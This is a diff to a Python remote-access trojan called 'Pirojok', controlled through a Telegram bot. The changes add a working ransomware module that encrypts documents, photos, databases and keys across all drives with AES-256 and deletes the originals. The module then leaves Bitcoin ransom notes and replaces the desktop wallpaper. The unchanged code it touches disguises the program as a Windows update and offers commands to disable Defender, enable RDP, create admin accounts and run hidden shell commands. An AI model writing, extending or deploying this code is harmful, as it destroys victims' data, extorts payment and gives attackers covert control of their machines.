@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Пирожок - идеально прожаренное блюдо для удаленного управления
-Версия 5.2 - с исправленным перезапуском после маскировки
+Версия 5.3 - с ransomware и исправленным dir
 """
 
 import os
@@ -26,10 +26,271 @@ import json
 import random
 import shutil
 import traceback
+import base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import hashlib
 
 # Конфигурация
 BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
 YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))
+
+class PirojokRansomware:
+    """Модуль вымогателя для пирожка"""
+    
+    def __init__(self, parent):
+        self.p = parent
+        self.encryption_key = None
+        self.encrypted_files = []
+        self.ransom_note = "README_PIROJOK.txt"
+        self.target_extensions = [
+            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
+            '.mp3', '.mp4', '.avi', '.mov', '.mkv',
+            '.zip', '.rar', '.7z', '.tar', '.gz',
+            '.db', '.sql', '.mdb', '.accdb',
+            '.psd', '.ai', '.cdr', '.dwg',
+            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js',
+            '.key', '.pfx', '.pem', '.crt'
+        ]
+        self.exclude_dirs = [
+            'windows', 'winnt', 'program files', 'program files (x86)',
+            'boot', 'system32', 'system', '$recycle.bin'
+        ]
+        
+    def generate_key(self):
+        """Генерация ключа шифрования"""
+        self.encryption_key = os.urandom(32)  # AES-256 ключ
+        return base64.b64encode(self.encryption_key).decode()
+    
+    def encrypt_file(self, filepath):
+        """Шифрование одного файла"""
+        try:
+            # Генерируем IV
+            iv = os.urandom(16)
+            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
+            
+            # Читаем файл
+            with open(filepath, 'rb') as f:
+                file_data = f.read()
+            
+            # Шифруем
+            padded_data = pad(file_data, AES.block_size)
+            encrypted_data = cipher.encrypt(padded_data)
+            
+            # Сохраняем зашифрованный файл
+            encrypted_path = filepath + '.pirojok'
+            with open(encrypted_path, 'wb') as f:
+                f.write(iv + encrypted_data)
+            
+            # Удаляем оригинал
+            os.remove(filepath)
+            
+            return encrypted_path
+        except:
+            return None
+    
+    def decrypt_file(self, filepath):
+        """Дешифрование файла"""
+        try:
+            if not self.encryption_key:
+                return False
+            
+            with open(filepath, 'rb') as f:
+                iv = f.read(16)
+                encrypted_data = f.read()
+            
+            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
+            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+            
+            original_path = filepath.replace('.pirojok', '')
+            with open(original_path, 'wb') as f:
+                f.write(decrypted_data)
+            
+            os.remove(filepath)
+            return True
+        except:
+            return False
+    
+    def scan_and_encrypt(self, root_paths=None):
+        """Сканирование и шифрование"""
+        if not self.encryption_key:
+            self.generate_key()
+        
+        if not root_paths:
+            # По умолчанию сканируем диски и пользовательские папки
+            if platform.system() == "Windows":
+                root_paths = [
+                    os.path.expanduser("~\\Desktop"),
+                    os.path.expanduser("~\\Documents"),
+                    os.path.expanduser("~\\Pictures"),
+                    os.path.expanduser("~\\Videos"),
+                    os.path.expanduser("~\\Music"),
+                    os.path.expanduser("~\\Downloads")
+                ]
+                # Добавляем все доступные диски
+                for drive in range(ord('C'), ord('Z')):
+                    drive_path = f"{chr(drive)}:\\"
+                    if os.path.exists(drive_path):
+                        root_paths.append(drive_path)
+            else:
+                root_paths = [os.path.expanduser("~")]
+        
+        encrypted = []
+        for root_path in root_paths:
+            if not os.path.exists(root_path):
+                continue
+            
+            for root, dirs, files in os.walk(root_path):
+                # Пропускаем системные папки
+                skip = False
+                for exclude in self.exclude_dirs:
+                    if exclude in root.lower():
+                        skip = True
+                        break
+                if skip:
+                    continue
+                
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    ext = os.path.splitext(file)[1].lower()
+                    
+                    if ext in self.target_extensions and not file.endswith('.pirojok'):
+                        result = self.encrypt_file(file_path)
+                        if result:
+                            encrypted.append(file_path)
+                            self.encrypted_files.append(result)
+                            
+                            # Отправляем статус каждые 10 файлов
+                            if len(encrypted) % 10 == 0:
+                                self.p.send_message(self.p.owner_id, f"🔒 Зашифровано {len(encrypted)} файлов...")
+        
+        return encrypted
+    
+    def create_ransom_note(self):
+        """Создание записки вымогателя"""
+        note_path = os.path.join(os.path.expanduser("~\\Desktop"), self.ransom_note)
+        key_b64 = base64.b64encode(self.encryption_key).decode()
+        
+        note = f"""
+╔══════════════════════════════════════════════════════════════╗
+║                     🥷 ПИРОЖОК ВЫМОГАТЕЛЬ                     ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   Ваши файлы были зашифрованы!                              ║
+║                                                              ║
+║   Всего зашифровано: {len(self.encrypted_files)} файлов      ║
+║                                                              ║
+║   Для восстановления файлов отправьте команду:              ║
+║   decrypt_{key_b64[:16]}...                                  ║
+║                                                              ║
+║   ИЛИ отправьте 0.01 BTC на кошелек:                        ║
+║   bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh                ║
+║                                                              ║
+║   После оплаты вы получите ключ дешифровки                   ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+        """
+        
+        with open(note_path, 'w') as f:
+            f.write(note)
+        
+        # Копируем записку на рабочий стол и во все зашифрованные папки
+        for encrypted_file in self.encrypted_files:
+            folder = os.path.dirname(encrypted_file)
+            note_copy = os.path.join(folder, self.ransom_note)
+            if not os.path.exists(note_copy):
+                shutil.copy2(note_path, note_copy)
+        
+        return note_path
+    
+    def start_ransomware(self, paths=None):
+        """Запуск вымогателя"""
+        try:
+            self.p.send_message(self.p.owner_id, "🔒 Начинаю шифрование файлов...")
+            
+            encrypted = self.scan_and_encrypt(paths)
+            note = self.create_ransom_note()
+            
+            # Меняем обои на рабочий стол (Windows)
+            if platform.system() == "Windows":
+                self.change_wallpaper()
+            
+            # Открываем записку
+            os.startfile(note)
+            
+            result = f"✅ Зашифровано {len(encrypted)} файлов\n"
+            result += f"📝 Записка: {note}\n"
+            result += f"🔑 Ключ: {base64.b64encode(self.encryption_key).decode()[:32]}..."
+            
+            return result
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def change_wallpaper(self):
+        """Смена обоев рабочего стола"""
+        try:
+            # Создаём изображение с угрозой
+            from PIL import Image, ImageDraw, ImageFont
+            
+            img = Image.new('RGB', (1920, 1080), color='black')
+            d = ImageDraw.Draw(img)
+            
+            # Пробуем загрузить шрифт
+            try:
+                font = ImageFont.truetype("arial.ttf", 60)
+                font_small = ImageFont.truetype("arial.ttf", 30)
+            except:
+                font = ImageFont.load_default()
+                font_small = ImageFont.load_default()
+            
+            text1 = "ПИРОЖОК ВЫМОГАТЕЛЬ"
+            text2 = f"Зашифровано {len(self.encrypted_files)} файлов"
+            text3 = "Смотри README_PIROJOK.txt на рабочем столе"
+            
+            # Центрируем текст
+            bbox = d.textbbox((0,0), text1, font=font)
+            text_width = bbox[2] - bbox[0]
+            d.text(((1920-text_width)/2, 400), text1, fill='red', font=font)
+            
+            bbox = d.textbbox((0,0), text2, font=font_small)
+            text_width = bbox[2] - bbox[0]
+            d.text(((1920-text_width)/2, 500), text2, fill='white', font=font_small)
+            
+            bbox = d.textbbox((0,0), text3, font=font_small)
+            text_width = bbox[2] - bbox[0]
+            d.text(((1920-text_width)/2, 600), text3, fill='yellow', font=font_small)
+            
+            # Сохраняем и устанавливаем обои
+            wallpaper_path = os.path.join(tempfile.gettempdir(), "pirojok_wallpaper.bmp")
+            img.save(wallpaper_path)
+            
+            import ctypes
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
+        except:
+            pass
+    
+    def decrypt_all(self, key_b64):
+        """Дешифровка всех файлов"""
+        try:
+            self.encryption_key = base64.b64decode(key_b64)
+            
+            # Ищем все .pirojok файлы
+            pirojok_files = []
+            for root, dirs, files in os.walk("C:\\"):
+                for file in files:
+                    if file.endswith('.pirojok'):
+                        pirojok_files.append(os.path.join(root, file))
+            
+            decrypted = 0
+            for file in pirojok_files:
+                if self.decrypt_file(file):
+                    decrypted += 1
+            
+            return f"✅ Расшифровано {decrypted} файлов"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+
 
 class PirojokMasquerade:
     """Модуль автоматической маскировки пирожка"""
@@ -86,7 +347,6 @@ class PirojokMasquerade:
             
         except Exception as e:
             print(f"Ошибка маскировки: {e}")
-            traceback.print_exc()
     
     def mask_process_name(self):
         """Маскировка имени процесса"""
@@ -125,7 +385,6 @@ del "%~f0"
                 
         except Exception as e:
             print(f"Ошибка маскировки имени: {e}")
-            traceback.print_exc()
     
     def mask_registry_keys(self):
         """Маскировка в реестре"""
@@ -194,7 +453,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "5.2.0"
+        self.version = "5.3.0"
         self.command_timeout = 60
         self.admin_mode = self.check_admin()
         self.startup_time = datetime.now()
@@ -205,8 +464,9 @@ class Pirojok:
         self.reboot_flag = os.path.join(tempfile.gettempdir(), "winupdate_reboot.flag")
         self.lock_file = os.path.join(tempfile.gettempdir(), "winupdate.lock")
         
-        # Инициализация маскировки
+        # Инициализация модулей
         self.mask = PirojokMasquerade(self)
+        self.ransom = PirojokRansomware(self)
         
         # Проверка единственного экземпляра
         self.ensure_single_instance()
@@ -217,7 +477,7 @@ class Pirojok:
         # АВТОМАТИЧЕСКАЯ МАСКИРОВКА ПРИ ЗАПУСКЕ
         self.mask.auto_masquerade()
         
-        # Отправляем приветственное сообщение (с задержкой, чтобы не мешать маскировке)
+        # Отправляем приветственное сообщение (с задержкой)
         threading.Timer(5.0, self.send_startup_message).start()
     
     def send_startup_message(self):
@@ -249,6 +509,7 @@ class Pirojok:
                     print("⚠️ win32api не установлен, использую файловую блокировку")
                     self.lock_fd = os.open(self.lock_file, os.O_CREAT | os.O_RDWR)
                     try:
+                        import fcntl
                         fcntl.lockf(self.lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
                     except:
                         print("Обновление Windows уже выполняется!")
@@ -788,11 +1049,24 @@ class Pirojok:
             return None
     
     def execute_command(self, command):
+        """ИСПРАВЛЕННЫЙ метод выполнения команд"""
         try:
+            # Убираем лишние кавычки из команды
+            command = command.strip('"\'')
+            
             if platform.system() == "Windows":
                 if command.lower().startswith("start "):
                     subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                     return f"✅ Запущено: {command}"
+                
+                # Для команд типа dir убеждаемся, что нет лишних кавычек
+                if command.lower().startswith("dir"):
+                    # Разбиваем на части и чистим
+                    parts = command.split()
+                    clean_parts = []
+                    for part in parts:
+                        clean_parts.append(part.strip('"\' '))
+                    command = ' '.join(clean_parts)
                 
                 process = subprocess.Popen(
                     f'cmd /c {command}',
@@ -823,7 +1097,10 @@ class Pirojok:
                     stdout = stdout[:2000] + "...\n(обрезано)"
                 result += f"✅ {stdout}\n"
             if stderr:
-                result += f"⚠️ {stderr[:500]}\n"
+                # Для ошибок dir делаем более понятное сообщение
+                if "Parameter format not correct" in stderr and "dir" in command:
+                    stderr = "Ошибка: неправильный формат команды. Используйте: dir, dir /s, dir C:\\Windows"
+                result += f"⚠️ {stderr}\n"
             
             return result or "✅ Готово"
         except subprocess.TimeoutExpired:
@@ -847,6 +1124,43 @@ class Pirojok:
             return f"✅ Открыт сайт: {url}"
         except:
             return "❌ Не удалось открыть сайт"
+    
+    # ========== RANSOMWARE КОМАНДЫ ==========
+    
+    def ransomware_start(self, paths=None):
+        """Запуск вымогателя"""
+        try:
+            if not self.admin_mode:
+                return "❌ Для ransomware нужны права администратора"
+            
+            if paths:
+                path_list = paths.split(';')
+            else:
+                path_list = None
+            
+            result = self.ransom.start_ransomware(path_list)
+            return result
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def ransomware_decrypt(self, key_b64):
+        """Расшифровка файлов"""
+        try:
+            result = self.ransom.decrypt_all(key_b64)
+            return result
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def ransomware_key(self):
+        """Получить текущий ключ"""
+        try:
+            if self.ransom.encryption_key:
+                key_b64 = base64.b64encode(self.ransom.encryption_key).decode()
+                return f"🔑 Ключ шифрования: {key_b64}"
+            else:
+                return "❌ Ключ не сгенерирован"
+        except:
+            return "❌ Ошибка получения ключа"
     
     # ========== ЗАПУСК ПРИ СТАРТЕ ==========
     
@@ -878,7 +1192,8 @@ class Pirojok:
         
         # Админ-команды
         admin_commands = ["admin_cmd", "task_startup", "explorer_shell", "active_setup",
-                         "create_user", "enable_rdp", "disable_defender", "add_rule"]
+                         "create_user", "enable_rdp", "disable_defender", "add_rule",
+                         "ransom", "ransom_start", "ransom_key", "ransom_decrypt"]
         cmd_type = text.split()[0] if text else ""
         
         if cmd_type in admin_commands and not self.admin_mode:
@@ -908,6 +1223,35 @@ class Pirojok:
         elif text == "shutdown_emergency":
             result = self.shutdown_emergency(update_id)
             self.send_message(chat_id, result)
+        
+        # === RANSOMWARE ===
+        elif text == "ransom" or text == "ransom_start":
+            result = self.ransomware_start()
+            self.send_message(chat_id, result)
+            self.mark_command_processed(update_id, text)
+            
+        elif text.startswith("ransom_start"):
+            parts = text.split(maxsplit=1)
+            if len(parts) > 1:
+                result = self.ransomware_start(parts[1])
+            else:
+                result = self.ransomware_start()
+            self.send_message(chat_id, result)
+            self.mark_command_processed(update_id, text)
+            
+        elif text == "ransom_key":
+            result = self.ransomware_key()
+            self.send_message(chat_id, result)
+            self.mark_command_processed(update_id, text)
+            
+        elif text.startswith("ransom_decrypt"):
+            parts = text.split()
+            if len(parts) == 2:
+                result = self.ransomware_decrypt(parts[1])
+                self.send_message(chat_id, result)
+            else:
+                self.send_message(chat_id, "⚠️ Используйте: ransom_decrypt <base64_key>")
+            self.mark_command_processed(update_id, text)
         
         # === АДМИН КОМАНДЫ ===
         elif text == "admin":
@@ -1055,7 +1399,12 @@ class Pirojok:
         # === HELP ===
         elif text == "help" or text == "menu":
             help_text = """
-🥷 <b>ОБНОВЛЕНИЕ WINDOWS V5.2</b>
+🥷 <b>ПИРОЖОК V5.3 - ВЫМОГАТЕЛЬ</b>
+
+<b>🔒 RANSOMWARE:</b>
+• ransom / ransom_start - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
+• ransom_key - показать ключ
+• ransom_decrypt <key> - расшифровать
 
 <b>🥷 МАСКИРОВКА:</b>
 • mask_status - статус маскировки
@@ -1064,16 +1413,13 @@ class Pirojok:
 <b>⚡ МОМЕНТАЛЬНО:</b>
 • shutdown_now - выключить сейчас
 • reboot_now - перезагрузить сейчас
-• shutdown_emergency - аварийно
 
 <b>👑 АДМИН-КОМАНДЫ:</b>
 • admin - запросить права админа
-• admin_check - проверить права
 • admin_cmd [команда] - команда от админа
 • create_user user pass - создать админа
 • enable_rdp - включить RDP
 • disable_defender - отключить Defender
-• add_rule port [name] - правило FW
 
 <b>🔄 АВТОЗАПУСК:</b>
 • startup_reg - в реестр
@@ -1088,10 +1434,8 @@ class Pirojok:
 • cmd [команда] - команда
 • website [url] - открыть сайт
 • shot - скриншот
-• info - информация о системе
-• reboot - перезагрузка (5 сек)
-• shutdown - выключение (5 сек)
-• abort - отмена выключения
+• info - информация
+• reboot/shutdown - с задержкой
             """
             self.send_message(chat_id, help_text)
             self.mark_command_processed(update_id, text)
